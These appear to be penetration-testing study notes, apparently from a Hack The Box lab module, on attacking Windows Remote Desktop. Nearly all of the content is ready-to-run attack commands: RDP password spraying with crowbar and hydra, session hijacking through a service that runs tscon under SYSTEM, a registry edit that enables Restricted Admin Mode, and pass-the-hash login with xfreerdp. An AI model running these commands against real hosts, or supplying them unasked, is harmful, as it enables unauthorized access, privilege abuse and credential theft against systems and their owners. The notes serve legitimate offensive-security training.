## Enumeration

```sh
nmap -Pn -p3389 192.168.2.143 
```

## Misconfigurations

#### Crowbar - RDP Password Spraying

```sh
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

#### Hydra - RDP Password Spraying

```sh
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

#### RDP Login

```sh
rdesktop -u admin -p password123 192.168.2.143
```

## Protocol Specific Attacks

#### RDP Session Hijacking

- we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-1-2.png)

- To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session 

```sh
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

- running the command 

```sh
net start sessionhijack
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-3-2.png)


## RDP Pass-the-Hash (PtH)

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host

#### Adding the DisableRestrictedAdmin Registry Key

```sh
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![i](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/116/rdp_session-5.png)

- now we can RDP using the SAM hash

```sh
xfreerdp3 /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

